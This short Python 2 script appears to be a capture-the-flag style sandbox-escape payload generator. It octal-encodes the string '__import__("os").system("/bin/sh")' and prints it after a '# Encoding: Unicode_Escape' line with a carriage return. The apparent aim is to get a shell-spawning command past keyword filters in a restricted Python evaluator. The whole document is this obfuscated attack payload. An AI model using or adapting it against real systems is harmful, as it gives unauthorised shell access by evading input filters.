string = '__import__("os").system("/bin/sh")'
full = ""

for i in range(len(string)):
        full += "\\%03o"%ord(string[i])

print "# Encoding: Unicode_Escape \r"+full
